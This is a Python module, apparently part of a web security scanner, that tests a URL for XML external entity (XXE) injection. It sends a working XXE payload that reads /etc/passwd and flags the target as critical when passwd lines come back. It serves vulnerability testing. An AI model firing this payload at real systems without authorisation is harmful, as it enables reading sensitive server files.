from utils.colors import console

XXE_PAYLOAD = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>'''

def check_xxe(requester, url):
    result = {"name": "XXE", "findings": [], "vulnerable": []}
    console.print("[info]  -> Testing XXE via POST XML...[/info]")
    headers = {"Content-Type": "application/xml"}
    try:
        resp = requester.post(url, data=XXE_PAYLOAD, headers=headers)
    except Exception:
        resp = None
    if not resp:
        console.print("[dim]    i No response, skipping[/dim]")
        return result
    if "root:" in resp.text and ":0:0:" in resp.text:
        console.print("[vuln]    !! XXE detected![/vuln]")
        result["vulnerable"].append({"url": url})
        result["findings"].append({"severity": "critical", "msg": "XXE detected (file read via XML entity)"})
    else:
        console.print("[success]    + No XXE found[/success]")
    return result
